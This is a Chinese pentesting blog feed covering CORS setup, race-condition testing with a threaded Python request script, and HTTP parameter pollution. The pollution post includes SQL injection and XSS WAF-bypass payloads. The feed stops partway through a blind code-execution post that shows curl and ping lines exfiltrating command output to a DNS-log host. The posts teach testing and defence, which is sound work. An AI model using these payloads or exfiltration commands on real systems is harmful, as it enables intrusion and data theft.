<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>VK&#39;s blog</title>
  
  <subtitle>VK&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.vkxss.top/"/>
  <updated>2019-11-19T06:39:00.683Z</updated>
  <id>http://www.vkxss.top/</id>
  
  <author>
    <name>VK</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SpringCloud下微服务网关配置Cors跨域请求</title>
    <link href="http://www.vkxss.top/2019/11/19/SpringCloud%E4%B8%8B%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AECors%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/"/>
    <id>http://www.vkxss.top/2019/11/19/SpringCloud下微服务网关配置Cors跨域请求/</id>
    <published>2019-11-19T06:37:28.718Z</published>
    <updated>2019-11-19T06:39:00.683Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="一-问题背景">一、 问题背景</span></h2><pre><code>公司的项目需要前后端分离，vue+java，这时候就需要支持Cors跨域请求了.</code></pre><h3><span id="11-什么是cors">1.1 什么是Cors?</span></h3><pre><code>CORS 全称是跨域资源共享（Cross-Origin Resource Sharing），是一种 AJAX 跨域请求资源的方式，支持现代浏览器，IE支持10以上。CORS与JSONP的使用目的相同，但是比JSONP更强大。JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。简单来说Cors就是用来解决跨域问题的。此外解决的方式还有：Nginx反向代理，Jsoup等方式。不过Nginx不符合Devops理念，不易维护，而Jsoup支持的请求类型只支持Get请求。Cors更为适合；</code></pre><h2><span id="12-什么是跨域">1.2 什么是跨域？</span></h2><pre><code>同源就是指：域名，协议，端口 均相同跨域就是指： 域名，协议，端口 其中至少有一个是不同的；当前端请求后端接口的时候，当端口号，ip地址等不一致的时候，为了安全性考量，请求所响应的数据不会被前端展示。等于请求的数据没有被标识为友军，没有被证明是敌是友；ajax请求才会出现跨域</code></pre><h3><span id="13-cors能解决什么问题">1.3 Cors能解决什么问题？</span></h3><pre><code>通过在服务端配置Cors相关的东西，能识别是否给予跨域权限，然后给予能跨域的标识，通过此标识，浏览器就可以渲染返回来的数据啦~~</code></pre><h2><span id="二-cors在springcloud微服务中的使用">二. Cors在SpringCloud微服务中的使用；</span></h2><h3><span id="21-环境">2.1 环境：</span></h3><pre><code>JDK1.8 IDEA SpringCloud微服务 网关使用Zuul</code></pre><h3><span id="22-代码">2.2 代码：</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">package com.leyou.gateway.config;</span><br><span class="line"></span><br><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line">import org.springframework.web.cors.CorsConfiguration;</span><br><span class="line">import org.springframework.web.cors.UrlBasedCorsConfigurationSource;</span><br><span class="line">import org.springframework.web.filter.CorsFilter;</span><br><span class="line"></span><br><span class="line">@Configuration</span><br><span class="line">public class CorsConfiguration &#123;</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public CorsFilter corsFilter()&#123;</span><br><span class="line">        //配置初始化对象</span><br><span class="line">        CorsConfiguration configuration=new CorsConfiguration();</span><br><span class="line">        //允许跨域的域名，如果要携带cookie，不能写* 。  *：代表所有的域名都可以访问</span><br><span class="line">        configuration.addAllowedOrigin(&quot;http://localhost:9001&quot;);</span><br><span class="line">        configuration.setAllowCredentials(true);</span><br><span class="line">        configuration.addAllowedMethod(&quot;*&quot;);            //代表所有的请求方法</span><br><span class="line">        configuration.addAllowedHeader(&quot;*&quot;);        //允许携带任何头信息</span><br><span class="line"></span><br><span class="line">        //初始化cors配置源对象</span><br><span class="line">        UrlBasedCorsConfigurationSource configurationSource=new UrlBasedCorsConfigurationSource();</span><br><span class="line">        configurationSource.registerCorsConfiguration(&quot;/**&quot;,configuration);</span><br><span class="line"></span><br><span class="line">        //返回corsFilter实例，参数:cors配置源对象</span><br><span class="line">        return new CorsFilter(configurationSource);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="23-什么是zuul微服务网关">2.3 什么是zuul微服务网关：</span></h3><ul><li><a href="https://www.jianshu.com/p/29e9c91e3f3e" target="_blank" rel="noopener">https://www.jianshu.com/p/29e9c91e3f3e</a></li><li><a href="https://www.jianshu.com/p/7bc06a64519b" target="_blank" rel="noopener">https://www.jianshu.com/p/7bc06a64519b</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;一-问题背景&quot;&gt;一、 问题背景&lt;/span&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;公司的项目需要前后端分离，vue+java，这时候就需要支持Cors跨域请求了.&lt;/code&gt;&lt;/pre&gt;&lt;h3&gt;&lt;span id=&quot;11-什么是cors&quot;&gt;1.1 什么是Co
      
    
    </summary>
    
    
      <category term="JAVA" scheme="http://www.vkxss.top/categories/JAVA/"/>
    
    
      <category term="JAVA代码审计" scheme="http://www.vkxss.top/tags/JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Python多线程测试并发漏洞测试</title>
    <link href="http://www.vkxss.top/2019/11/13/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%B5%8B%E8%AF%95%E5%B9%B6%E5%8F%91%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"/>
    <id>http://www.vkxss.top/2019/11/13/Python-多线程测试并发漏洞测试/</id>
    <published>2019-11-13T07:30:08.000Z</published>
    <updated>2019-11-15T09:10:27.215Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#python多线程测试并发漏洞测试">Python多线程测试并发漏洞测试</a><ul><li><a href="#步骤记录">步骤记录</a></li></ul></li></ul><!-- tocstop --><h2><span id="python多线程测试并发漏洞测试">Python多线程测试并发漏洞测试</span></h2><ul><li>我们在使用黑盒，例如测试一些支付、兑换类的功能时，都需要进行多线程并发测试，来确保测试的应用在代码或者数据库层是否加锁。</li></ul><h3><span id="步骤记录">步骤记录</span></h3><ol><li>Burp Suite安装插件，方便生成python发包代码</li></ol><p><a href="https://imgchr.com/i/MYdT8H" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/13/MYdT8H.jpg" alt="MYdT8H.jpg"></a></p><ol start="2"><li>拦截包并生成代码,并打开一个文本编辑器，右键粘贴出来：</li></ol><p><a href="https://imgchr.com/i/MYdoPe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/13/MYdoPe.jpg" alt="MYdoPe.jpg"></a></p><ol start="3"><li>运行Python多线程代码</li></ol><p>将生成的python代码粘贴到action()函数里面即可；</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line">def action():</span><br><span class="line">    burp0_url = &quot;https://www.baidu.com:443/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=1&quot;</span><br><span class="line">    burp0_cookies = &#123;&quot;BAIDUID&quot;: &quot;E316F3DB8A100CF49C7840194D685130:FG=1&quot;, &quot;BIDUPSID&quot;: &quot;E316F3DB8A100CF4365A4179630696D4&quot;, &quot;PSTM&quot;: &quot;1571902876&quot;, &quot;BD_UPN&quot;: &quot;133252&quot;, &quot;H_PS_PSSID&quot;: &quot;1434_21105_29568_29220_22160&quot;, &quot;BDORZ&quot;: &quot;B490B5EBF6F3CD402E515D22BCDA1598&quot;, &quot;delPer&quot;: &quot;0&quot;, &quot;BD_CK_SAM&quot;: &quot;1&quot;, &quot;PSINO&quot;: &quot;2&quot;, &quot;BD_HOME&quot;: &quot;0&quot;, &quot;H_PS_645EC&quot;: &quot;6d50bLk7EAzhqdJENzPoKrR6B%2FRN9gavPDwdfFeqclmRNgzaMlT7KBxZaRg&quot;, &quot;COOKIE_SESSION&quot;: &quot;292444_5_6_2_4_26_0_2_2_5_0_0_243247_0_0_0_1573179527_1572936381_1573657905%7C6%23221_3_1572936369%7C2&quot;, &quot;BDSVRTM&quot;: &quot;130&quot;&#125;</span><br><span class="line">    burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125;</span><br><span class="line">    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">    # print(res.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    </span><br><span class="line">    print(&quot;threading start!&quot;)</span><br><span class="line"></span><br><span class="line">    for i in range(50):</span><br><span class="line">        t = threading.Thread(target=action)</span><br><span class="line">        t.start()</span><br><span class="line">        </span><br><span class="line">    print(&quot;threading end!&quot;)</span><br></pre></td></tr></table></figure></code></pre><ol start="4"><li>确认结果即可</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#python多线程测试并发漏洞测试&quot;&gt;Python多线程测试并发漏洞测试&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#步骤记录&quot;&gt;步骤记录&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocst
      
    
    </summary>
    
    
      <category term="Python" scheme="http://www.vkxss.top/categories/Python/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>条件竞争漏洞总结</title>
    <link href="http://www.vkxss.top/2019/11/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://www.vkxss.top/2019/11/12/渗透测试-条件竞争漏洞总结/</id>
    <published>2019-11-12T07:30:08.000Z</published>
    <updated>2019-11-13T15:35:02.401Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-条件竞争漏洞介绍">0x00 条件竞争漏洞介绍</a></li><li><a href="#0x01-漏洞挖掘">0x01 漏洞挖掘</a></li><li><a href="#0x02-测试流程">0x02 测试流程</a></li><li><a href="#0x03-漏洞案例">0x03 漏洞案例</a></li><li><a href="#0x04-测试技巧">0x04 测试技巧</a><ul><li><a href="#使用burp模块-inturder">使用Burp模块-Inturder</a></li></ul></li><li><a href="#修复建议">修复建议</a></li><li><a href="#漏洞防御">漏洞防御</a></li></ul><!-- tocstop --><h2><span id="0x00-条件竞争漏洞介绍">0x00 条件竞争漏洞介绍</span></h2><ul><li>竞争条件漏洞就是多个进程访问同一资源时产生的时间或者序列的冲突，并利用这个冲突来对系统进行攻击。一个看起来无害的程序如果被恶意攻击者利用，将发生竞争条件漏洞。</li></ul><h2><span id="0x01-漏洞挖掘">0x01 漏洞挖掘</span></h2><ul><li>一般挖掘的点：<ul><li>签到</li><li>支付</li><li>积分兑换</li><li>转账</li><li>优惠券</li><li>提现</li><li>文件上传</li><li>绕过数量限制</li><li>等。。</li></ul></li></ul><h2><span id="0x02-测试流程">0x02 测试流程</span></h2><ul><li>基本方法就是，例如在提交订单的时候，抓取包，然后构造脚本，进行多线程并发操作。</li></ul><h2><span id="0x03-漏洞案例">0x03 漏洞案例</span></h2><ul><li>利用竞争条件实现RCE<ul><li><a href="https://www.freebuf.com/column/215340.html" target="_blank" rel="noopener">https://www.freebuf.com/column/215340.html</a></li></ul></li><li>利用竞争条件实现提权<ul><li><a href="https://www.jianshu.com/p/7a50d424adb1" target="_blank" rel="noopener">https://www.jianshu.com/p/7a50d424adb1</a></li></ul></li></ul><h2><span id="0x04-测试技巧">0x04 测试技巧</span></h2><h3><span id="使用burp模块-inturder">使用Burp模块-Inturder</span></h3><p>选择Payload类型为空，将线程调到50进行多线程异步发包</p><p><a href="https://imgchr.com/i/MY81qe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/13/MY81qe.jpg" alt="MY81qe.jpg"></a><br><a href="https://imgchr.com/i/MY8lrD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/13/MY8lrD.jpg" alt="MY8lrD.jpg"></a></p><h2><span id="修复建议">修复建议</span></h2><ul><li>解决方案通常是加“锁”，mysql执行事务前加BEGIN，后加COMMIT，从而锁定一次事务处理，使按序进行：</li></ul><p><a href="https://imgchr.com/i/MY8QKO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/13/MY8QKO.jpg" alt="MY8QKO.jpg"></a></p><h2><span id="漏洞防御">漏洞防御</span></h2><ul><li><p>对于业务端条件竞争的防范，一般的方法是设置锁；</p></li><li><p>对于文件上传，一定要经过充分完整的检查之后再上传；</p></li><li><p>在操作系统的角度，共享数据要进行上锁保护。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-条件竞争漏洞介绍&quot;&gt;0x00 条件竞争漏洞介绍&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-漏洞挖掘&quot;&gt;0x01 漏洞挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-测试流程&quot;&gt;
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>参数污染漏洞（HPP）挖掘技巧</title>
    <link href="http://www.vkxss.top/2019/11/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%BC%8F%E6%B4%9E%EF%BC%88HPP%EF%BC%89%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/"/>
    <id>http://www.vkxss.top/2019/11/09/渗透测试-参数污染漏洞（HPP）挖掘技巧/</id>
    <published>2019-11-09T07:30:08.000Z</published>
    <updated>2019-11-10T14:44:59.594Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#参数污染漏洞hpp挖掘技巧记录">参数污染漏洞（HPP）挖掘技巧记录</a><ul><li><a href="#概念">概念：</a></li><li><a href="#漏洞原理">漏洞原理：</a></li><li><a href="#实战案例总结">实战案例总结：</a></li><li><a href="#挖掘技巧">挖掘技巧：</a></li><li><a href="#修复方案">修复方案：</a></li></ul></li></ul><!-- tocstop --><h2><span id="参数污染漏洞hpp挖掘技巧记录">参数污染漏洞（HPP）挖掘技巧记录</span></h2><h3><span id="概念">概念：</span></h3><p>HTTP参数污染，也叫HPP（HTTP Parameter Pollution）。简单地讲就是给一个参数赋上两个或两个以上的值，由于现行的HTTP标准没有提及在遇到多个输入值给相同的参数赋值时应该怎样处理，而且不同的网站后端做出的处理方式是不同的，从而造成解析错误。</p><h3><span id="漏洞原理">漏洞原理：</span></h3><ul><li><p>通过简单的案例可以说明这种处理的差异：</p></li><li><p>在不同的搜索引擎中进行搜索，在地址栏输入URL：/s?wd=test&amp;wd=test1，这里重复相同搜索参数，观察搜索结果的不同：</p><ul><li><p>(1)百度接受第一个参数（test）而放弃第二个参数（test1）：<br><a href="https://imgchr.com/i/MKcQJA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKcQJA.jpg" alt="MKcQJA.jpg"></a></p></li><li><p>(2)Yahho接受第二个参数（test1）而放弃第一个参数（test）：</p></li><li><p>(3)Google会将两个值都接受，并通过一个空格将两个参数连接起来，组成一个参数：</p></li></ul></li><li><p>测试不同服务器对漏洞的处理方法：</p><ul><li><p>对于Flask服务器，取第一个值</p></li><li><p>对于PHP/Apache服务器，取最后一个值<br>我们以弹窗为例，首先将js代码放在first参数name位置，返回string(3) “222” ，证明取的是最后一个name参数的值。<br><a href="https://imgchr.com/i/MKc1zt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKc1zt.jpg" alt="MKc1zt.jpg"></a><br><a href="https://imgchr.com/i/MKclRI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKclRI.jpg" alt="MKclRI.jpg"></a></p></li><li><p>具体服务端对应的不同处理方式如下<br><a href="https://imgchr.com/i/MKcMid" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/10/MKcMid.jpg" alt="MKcMid.jpg"></a></p></li></ul></li></ul><h3><span id="实战案例总结">实战案例总结：</span></h3><ul><li><p>HPP漏洞的产生原因一方面来自服务器处理机制的不同，另一方面来自开发人员后端检测逻辑的问题。HTTP 参数污染的风险实际上取决于后端所执行的操作，以及被污染的参数提交到了哪里。总体上HPP一般有两种利用场景：</p><ul><li>1）逻辑漏洞，通常会造成IDOR，信息泄露，越权等漏洞;</li></ul><ul><li>2）作为其他漏洞的辅助，用于绕过漏洞的检测和Waf等。</li></ul></li></ul><ul><li><p>这里汇总了工作中和国内外遇到的一些典型案例：</p></li><li><p>1、 逻辑漏洞（IDOR）</p><ul><li><p>1）敏感操作</p><ul><li>SilverlightFox中，网站通过URL：<a href="https://www.example.com/transferMoney.php?amount=1000&amp;fromAccount=12345进行转账操作，原本链接中是没有toAmount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：toAccount=9876&amp;amount=1000&amp;fromAccount=12345&amp;toAccount=99999第二个" target="_blank" rel="noopener">https://www.example.com/transferMoney.php?amount=1000&amp;fromAccount=12345进行转账操作，原本链接中是没有toAmount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：toAccount=9876&amp;amount=1000&amp;fromAccount=12345&amp;toAccount=99999第二个</a> toAccount 参数，会覆盖后端请求，并将钱转账给恶意账户（ 99999 ）而不是由系统设置的预期账户（ 9876 ）。</li></ul></li><li><p>(2）IDOR（不安全的对象引用）</p><ul><li>一般的社交软件都有“关注”或”喜欢”功能，下面就是ID为5318415对5333003进行关注发送的数据包：</li><li>按我们通常挖掘逻辑漏洞的思路，我们可以篡改ID值，使对方关注我。这里5318415是我的ID，但将我的actorId替换为对方的ID，会收到“401 Unauthorized”错误，说明此处做了鉴权操作。</li><li>但是，如果请求2个actorId参数，第一个actorId参数是目标的actorId。这样5024700（受害者）会关注5318415（我）。这次得到的响应是202 Accepted。</li><li>后台对于actorId的鉴权操作是对第二个，关注操作取的却是第一个。所以在测试越权类问题时未果不妨多试一步HPP，下面Twitter案例也是如出一辙：<a href="https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26" target="_blank" rel="noopener">https://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26</a></li><li>通过添加第二个uid，取消Twitter的邮箱提醒。</li></ul></li><li><p>3）社交分享链接</p><ul><li>不少网站都有社交分享按钮，可以把内容分享到其他社交媒体，如Hackerone的链接为：<a href="https://hackerone.com/blog/introducing-signal，分享到FB上链接为：" target="_blank" rel="noopener">https://hackerone.com/blog/introducing-signal，分享到FB上链接为：</a></li><li><a href="https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal" target="_blank" rel="noopener">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal</a></li><li>如果我们将要分享的Hackerone的链接改为：<a href="https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov，则最终的跳转会成为：" target="_blank" rel="noopener">https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov，则最终的跳转会成为：</a></li><li><a href="https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov" target="_blank" rel="noopener">https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov</a></li><li>后一个参数u拥有比第一个更高的优先级，之后会用于 Fackbook 的发布，最终会跳转到恶意站点<a href="https://vk.com/durov。" target="_blank" rel="noopener">https://vk.com/durov。</a></li></ul></li><li><p>4）页面跳转</p><ul><li>一个Digits跳转的案例，跳转链接如下：</li><li><a href="https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv" target="_blank" rel="noopener">https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv</a></li><li>如果直接修改参数为<a href="http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP：" target="_blank" rel="noopener">http://attacker.com，由于注册域不匹配，因此页面将显示错误，但如果我们使用HPP：</a></li><li><a href="https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com" target="_blank" rel="noopener">https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com</a></li><li>从而第一个host参数绕过验证，取第二个host参数作为跳转源。</li></ul></li><li><p>5）权限操作</p><ul><li><p>以下代码：</p><p><code>&lt;? $val=htmlspecialchars($_GET[&#39;par&#39;],ENT_QUOTES); ?&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 以下代码使用par参数取用户输入并生成URL：</span><br><span class="line">- http://host/page.php?action=view&amp;par=123</span><br><span class="line">- 但用户若输入par为则最终生成的链接为：123&amp;amp;action=edit，则最终的请求则变成：</span><br><span class="line">- http://host/page.php?action=view&amp;par=123&amp;amp;action=edit</span><br><span class="line">- 通过重复提交action参数，会导致应用接受编辑操作而不是查看操作，实现权限的提升。</span><br><span class="line"></span><br><span class="line">- 注：&apos;&amp;amp;&apos; = &apos;&amp;&apos; ，在HTML中的&amp;用&amp;amp; 来表示</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><ul><li><p>2、 绕过检测（WAF）</p><ul><li><p>1）SQL绕过1</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 一个常见的SQL注入payload如:</span><br><span class="line">- http://xxx/horse.php?id=7 union select 1,2,3，current_user</span><br><span class="line">- 探测发现网站配置了WAF来阻止任意包含“select”或“union”等常用的SQL查询关键字，通过HPP绕过：</span><br><span class="line">- http://xxx/horse.php?id=0&amp;amp;id=7%20union%20select%201,2,3,current_user</span><br><span class="line">- 注入语句被写到第二个参数值的位置，不会被waf解析。</span><br></pre></td></tr></table></figure></li><li><p>2）SQL绕过2</p><ul><li>ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单。但是这个web服务器在遇到为同一个参数赋值不同数值时，会采取类似谷歌的处理方式，将参数连接起来，以此来绕过黑名单。例如提交如下的URL：</li><li><a href="http://xxx/index.aspx?page=select" target="_blank" rel="noopener">http://xxx/index.aspx?page=select</a> 1&amp;page=2,3 from table</li></ul></li><li><p>3）Apple Cups的XSS</p><ul><li>Apple Cups是被许多UNIX系统利用的打印系统。系统对kerberos进行了黑名单过滤，通过前置一个重复参数可以触发xss：</li><li><a href="http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos=" target="_blank" rel="noopener">http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos=</a></li><li>这个方法可以绕过系统的验证机制，原因是这个验证系统只采纳了第二个kerberos的值，这个值为空，因此不会触发。而第一个kerberos直到被用于构建动态HTML内容前都没有被验证。最终在web站点的上下文中javascript语句被执行。</li></ul></li><li><p>4）URL重定向+HPP+XSS</p><ul><li>在点击网站的链接时，会将用户重定向到一个页面，链接为：</li><li>xxx.aspx?dest=<a href="http://whitelistedWebsite.com" target="_blank" rel="noopener">http://whitelistedWebsite.com</a></li><li>这容易想到URL重定向漏洞，经过探测，发现dest参数接受的协议有http:// ftp:// http:/ javascript:/，所以尝试构造xss：</li><li>dest=javascript://alert(document.domain)</li><li>发现存在白名单限制，尝试绕过：</li><li>dest=javascript:/whitelistedWebsite.com/i;alert(document.domain</li><li>但分号；会无法解析，导致报错，最终使用HPP绕过：</li><li>dest=javascript:/whitelistedWebsite.com/i&amp;dest=alert(1)</li><li>原理和例1类似，接受两个参数值进行拼接：javascript://alert(1)</li></ul></li></ul></li></ul><h3><span id="挖掘技巧">挖掘技巧：</span></h3><ul><li><p>根据上面的实战案例总结，在挖掘HPP漏洞的时候，需要注意以下几点：</p><ul><li><p>1、和IDOR漏洞挖掘类似，关注与用户权限紧密相关的参数，有些场景可能防范了IDOR，但重复提交参数可能就会产生奇效；</p></li><li><p>2、在挖掘其他漏洞的时候，如果进行了检测又无法绕过的情况下，可以尝试通过重复提交参数/参数拼接方式绕过检测。</p></li></ul></li></ul><h3><span id="修复方案">修复方案：</span></h3><ul><li><p>概括地讲，防范这类攻击的方法有两种：</p><ul><li><p>1、设备层面，让WAF或其他网关设备（比如IPS）在检查URL时，对同一个参数被多次赋值的情况进行特殊处理。由于HTTP协议允许相同参数在URL中多次出现，因此这种特殊处理需要注意避免误杀的情况；</p></li><li><p>2、代码层面，编写WEB程序时，要通过合理的$_GET方法获取URL中的参数值，而尝试获取web服务器返回给程序的其他值时要慎重处理，结合其他漏洞的产生进行组合排查。</p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#参数污染漏洞hpp挖掘技巧记录&quot;&gt;参数污染漏洞（HPP）挖掘技巧记录&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#概念&quot;&gt;概念：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#漏洞原理&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEB渗透测试" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>无回显代码执行利用方法总结</title>
    <link href="http://www.vkxss.top/2019/11/08/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://www.vkxss.top/2019/11/08/渗透测试-无回显代码执行利用方法总结/</id>
    <published>2019-11-08T07:30:08.000Z</published>
    <updated>2019-11-10T04:54:57.610Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-dnslog回显">0X00 DNSLOG回显</a></li><li><a href="#0x01-curl上传文件">0X01 curl上传文件</a></li><li><a href="#0x02-wget">0X02 Wget</a></li><li><a href="#0x03-反弹shell">0X03 反弹shell</a></li></ul><!-- tocstop --><h2><span id="0x00-dnslog回显">0X00 DNSLOG回显</span></h2><ul><li><p>尝试DNSLOG获取回显使用反引号执行代码，并用curl将执行结果返回给DNSLOG</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl http://dnslog/`whoami`</span><br><span class="line">ping `whoami`.dnslog</span><br></pre></td></tr></table></figure><p>  <a href="https://imgchr.com/i/MZp6f0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/08/MZp6f0.jpg" alt="MZp6f0.jpg"></a><br>  <a href="https://imgchr.com/i/MZpDTs" 